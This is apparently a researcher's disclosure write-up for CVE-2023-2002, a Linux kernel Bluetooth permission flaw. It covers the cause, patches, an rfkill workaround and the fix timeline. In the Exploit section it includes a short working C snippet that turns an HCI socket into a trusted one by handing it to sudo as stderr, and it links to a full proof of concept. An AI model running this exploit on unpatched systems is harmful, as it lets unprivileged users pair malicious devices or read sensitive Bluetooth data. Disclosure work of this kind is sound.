# Linux Bluetooth: Unauthorized management command execution (CVE-2023-2002)

An insufficient permission check has been found in the Bluetooth subsystem of
the Linux kernel when handling ioctl system calls of HCI sockets. This causes
tasks without the proper CAP_NET_ADMIN capability can easily mark HCI sockets
as _trusted_. Trusted sockets are intended to enable the sending and receiving
of management commands and events, such as pairing or connecting with a new
device. As a result, unprivileged users can acquire a trusted socket, leading
to unauthorized execution of management commands. The exploit requires only
the presence of a set of commonly used setuid programs (e.g., su, sudo).

## Cause

The direct cause of the vulnerability is the following code snippet:
```c
static int hci_sock_ioctl(struct socket *sock, unsigned int cmd,
                          unsigned long arg)
{
	...
        if (hci_sock_gen_cookie(sk)) {
		...
                if (capable(CAP_NET_ADMIN))
                        hci_sock_set_flag(sk, HCI_SOCK_TRUSTED);
		...
        }
	...
}
```

The implementation of an ioctl system call verifies whether the task invoking
the call has the necessary CAP_NET_ADMIN capability to update the
HCI_SOCK_TRUSTED flag. However, this check only considers the calling task,
which may not necessarily be the socket opener. For instance, the socket can
be shared with another task using fork and execve, where the latter task may
be privileged, such as a setuid program. Moreover, if the socket is used as
stdout or stderr, an ioctl call is made to obtain tty parameters, which can be
verified through the strace command.
```
# strace -e trace=ioctl sudo > /dev/null
ioctl(3, TIOCGPGRP, [30305])            = 0
ioctl(2, TIOCGWINSZ, {ws_row=45, ws_col=190, ws_xpixel=0, ws_ypixel=0}) = 0
```

The ioctl calls for tty parameters will never succeed on HCI sockets, but they
are sufficient to mark HCI sockets as trusted. Therefore, an unprivileged
program can hold trusted HCI sockets, enabling it to send and receive
management commands and events, since the trusted flag will never be cleared.

## Exploit

The exploitation can be as easy as below:
```c
	int fd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);

	/* By executing sudo with an HCI socket as stderr, an ioctl
	 * system call makes the HCI socket privileged (i.e. with
	 * the HCI_SOCK_TRUSTED flag set).
	 */
	int pid = fork();
	if (pid == 0) {
		dup2(fd, 2);
		close(fd);
		execlp("sudo", "sudo", NULL);
	}

	waitpid(pid, NULL, 0);

	struct sockaddr_hci haddr;
	haddr.hci_family = AF_BLUETOOTH;
	haddr.hci_dev = HCI_DEV_NONE;
	haddr.hci_channel = HCI_CHANNEL_CONTROL;

	/* The socket has not been bound. It can be bound to the
	 * management channel now. After that, the HCI_SOCK_TRUSTED
	 * flag is still present, as it will indeed never be cleared.
	 */
	bind(fd, (struct sockaddr *)&haddr, sizeof(haddr));
```

Furthermore, btmon can be used to confirm that the socket becomes trusted and
successive management commands will succeed:
```
# btmon
@ RAW Open: sudo (privileged) version 2.22
@ RAW Close: sudo
@ MGMT Open: sudo (privileged) version 1.22
@ MGMT Command: Set Powered (0x0005) plen 1
        Powered: Disabled (0x00)
@ MGMT Event: Command Complete (0x0001) plen 7
      Set Powered (0x0005) plen 4
        Status: Success (0x00)
```

A full PoC exploit to change the power state of Bluetooth devices can be found
[on GitHub][exp].

[exp]: https://github.com/lrh2000/CVE-2023-2002/tree/master/exp

## Impact

If successfully exploited, the identified vulnerability has the potential to
compromise the confidentiality, integrity, and availability of Bluetooth
communication. Attackers can exploit this vulnerability to pair the controller
with malicious devices, even if the Bluetooth service is disabled or not
installed. It is also possible to prevent specific devices from being paired,
or read some sensitive information such as the OOB data.

## Affection

The exploitable vulnerability has been present in the Linux kernel since v4.9.
More specifically, it becomes exploitable after the [commit f81f5b2db869][cm]
("Bluetooth: Send control open and close messages for HCI raw sockets"). Prior
to this commit, exploiting the vulnerability required tricking a privileged
program into binding an HCI socket, which is very hard (if not impossible) to
trigger in practice. However, after the commit, it requires only tricking a
privileged program to invoke an ioctl system call, which relies only on the
existence of an setuid program, as illustrated above.

[cm]: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f81f5b2db869

The exploitation works as long as there are setuid programs (or more
precisely, programs with the CAP_NET_ADMIN capability) that invokes ioctl
calls on stdin, stdout, or stderr. In most Linux distros, a quick (but very
coarse) test reveals that quite a few setuid programs are using ioctl system
calls, which are marked with 'V' in the table below:
```
# find . -user root -perm -4000 -exec sh -c "strace -e trace=ioctl {} < /dev/null 2>&1 > /dev/null | grep ioctl > /dev/null && echo -n 'V ' || echo -n 'S '; echo {};" \; | sort
S ./chage
S ./expiry
S ./fusermount
S ./fusermount3
S ./gpasswd
S ./ksu
S ./mount.cifs
S ./sg
S ./umount
V ./chfn
V ./chsh
V ./mount
V ./newgrp
V ./passwd
V ./pkexec
V ./screen-4.9.0
V ./su
V ./sudo
V ./unix_chkpwd
```
After manually checking the strace output, it is found that all of these ioctl
users are using ioctl calls on stdin, stdout, or stderr to get or set some tty
parameters. Note that exactly no arguments are passed to these setuid
programs. If some crafted arguments are passed, the number of ioctl users may
increase. As a result, a number of linux distros can be vulnerable to the
exploitation.

As a side note, Android devices, however, are unlikely to be affected since
the exploitation requires the existence of setuid programs, which Android has
[avoided using][su] for some time. Besides, there are also no applications
with the CAP_NET_ADMIN capability on Android.

[su]: https://source.android.com/docs/security/enhancements/enhancements43

## Mitigation

[A patch][fi] has been posted to the linux-bluetooth mailing list which fixes
this vulnerability by replacing capable() with sk_capable(), where
sk_capable() checks not only the current task but also that the socket opener
has the required capability. At the same time, [another submitted patch][se]
hardens the ioctl processing logic by checking command validity at the start
of hci_sock_ioctl() and returning with an ENOIOCTLCMD error code immediately
before doing anything if the command is invalid.

[fi]: https://lore.kernel.org/linux-bluetooth/20230416081404.8227-1-lrh2000@pku.edu.cn
[se]: https://lore.kernel.org/linux-bluetooth/20230416080251.7717-1-lrh2000@pku.edu.cn

As a workaround, if the Bluetooth devices are not being used at all (but it is
not feasible to physically remove the device), it is possible to simply block
the devices using rfkill, which will prevent the devices from being powered
up. By doing so, sending management commands to power up Bluetooth devices
won't succeed. This can significantly reduce the impact of this vulnerability.

There are two ways to avoid similar vulnerabilities in the future: hardening
the Linux kernel and hardening userspace setuid programs.
 - There are many uses of capable() in the Linux kernel that check the
   capability of the current task, but do nothing about the file or socket
   opener. In many cases, it may be reasonable to also check the capability of
   the opener. However, adding more capability checks can lead to unexpected
   regressions, although no such examples in reality have been seen at the
   time of writing.
 - Stdin, stdout, and stderr are different from other file descriptors,
   because they are inherited from the parent task but are used directly by
   the current task. For privileged setuid programs, inherited file
   descriptors may need to be treated as untrusted. Therefore, it also seems
   reasonable to explicitly drop privileges when invoking system calls on
   these untrusted file descriptors.

## Relation

This vulnerability shares exactly the same principle as [CVE-2014-0181][c14]. In
the case of CVE-2014-0181, the issue was the lack of a mechanism to authorize
Netlink operations based on the opener of the socket, which allows local users
to modify network configurations by using a Netlink socket for the stdout or
stderr of a setuid program.

[c14]: https://nvd.nist.gov/vuln/detail/CVE-2014-0181

## Timeline

**2023-04-04:** I discovered this vulnerability during my audit of the
Bluetooth protocol stack in the Linux kernel.

**2023-04-09:** I have reported this vulnerability to the Linux kernel
security team and distribution vendors, with an initial version of patches.

**2023-04-12:** This vulnerability has been assigned a CVE ID, which is
CVE-2023-2002.

**2023-04-13:** After several days of discussion with the maintainers, the
patches have been updated accordingly.

**2023-04-16:** The vulnerability was disclosed on the public [oss-security
mailing list][oss] and on GitHub (here). Two patches have been posted to the
public linux-bluetooth mailing list ([first][fi], [second][se]).

[oss]: https://www.openwall.com/lists/oss-security/2023/04/16/3

**2023-05-01:** The [fix][fix] has landed in the mainline kernel (as part of
the [v6.4][6.4] merge window), as well as in [v6.3.1][6.3], [v6.2.14][6.2],
[v6.1.27][6.1], and [v5.15.110][5.15]. It has also been queued for the next
stable release of the v5.10, v5.4, v4.19, and v4.14 kernels.

[fix]: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=25c150ac103a4ebeed0319994c742a90634ddf18
[6.4]: https://lore.kernel.org/lkml/CAHk-=wiUxm-NZ1si8dXWVTTJ9n3c+1SRTC0V+Lk7hOE4bDVwJQ@mail.gmail.com/
[6.3]: https://lore.kernel.org/stable/2023050123-resubmit-silica-ac32@gregkh/
[6.2]: https://lore.kernel.org/stable/2023050120-coma-rift-e24b@gregkh/
[6.1]: https://lore.kernel.org/stable/2023050145-jacket-oversleep-bf26@gregkh/
[5.15]: https://lore.kernel.org/stable/2023050139-ashes-backstab-021f@gregkh/

**2023-05-17:** Finally, the [fix][fix] has landed in all stable kernels.
Specifically, it has also been applied to the [v5.10.180][5.10],
[v5.4.243][5.4], [v4.19.283][4.19], and [v4.14.315][4.14] kernels.

[5.10]: https://lore.kernel.org/stable/2023051728-headless-footing-9418@gregkh/
[5.4]: https://lore.kernel.org/stable/2023051722-harmless-excusably-7a79@gregkh/
[4.19]: https://lore.kernel.org/stable/2023051748-bridged-shortcut-c52b@gregkh/
[4.14]: https://lore.kernel.org/stable/2023051739-machinist-secluding-0747@gregkh/
